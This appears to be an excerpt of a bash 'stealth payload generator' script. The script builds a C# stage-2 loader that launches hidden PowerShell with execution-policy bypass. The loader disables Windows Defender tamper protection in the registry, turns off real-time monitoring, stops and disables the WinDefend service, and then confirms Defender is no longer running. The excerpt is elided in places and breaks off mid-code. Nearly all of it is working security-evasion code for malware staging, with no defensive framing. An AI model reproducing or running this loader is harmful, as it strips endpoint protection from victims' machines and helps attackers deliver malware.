#!/bin/bash
# pgen.sh - ULTIMATE STEALTH Payload Generator – PowerShell‑based Defender Disabler + Syscall Loader
...
# ========== C# STAGE2 LOADER (EXE) – PowerShell‑based Defender Disabler ==========
echo -e "${YELLOW}[3/5] Creating C# Stage2 loader (PowerShell defender disabler)...${NC}"
    ...
    class Program
    {
        ...
        static void RunPowerShell(string command)
        {
            try {
                ...
                psi.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -Command \\"" + command + "\\"";
        ...
        static void Main()
        {
            ...
            try
            {
                ...
                // 1. Disable Tamper Protection (registry)
                RunPowerShell("Set-ItemProperty -Path 'HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features' -Name 'TamperProtection' -Value 0 -Force");
                Log("Tamper protection disabled (attempted).");

                // 2. Disable real-time monitoring
                RunPowerShell("Set-MpPreference -DisableRealtimeMonitoring $true");
                Log("Real-time monitoring disabled.");
                Thread.Sleep(5000);

                // 3. Stop and disable Windows Defender service
                RunPowerShell("Stop-Service WinDefend -Force; Set-Service WinDefend -StartupType Disabled");
                Log("WinDefend service stopped and disabled.");
                Thread.Sleep(5000);

                // 4. Verify Defender is off (check service state)
                bool defenderRunning = true;
                int retries = 0;
                while (defenderRunning && retries < 5)
                {
                    string checkCommand = "if ((Get-Service WinDefend -ErrorAction SilentlyContinue).Status -eq 'Running') { exit 1 } else { exit 0 }";
                    ProcessStartInfo psi = new ProcessStartInfo();
                    psi.FileName = "powershell.exe";
                    psi.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -Command \\"" + checkCommand + "\\"";
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;
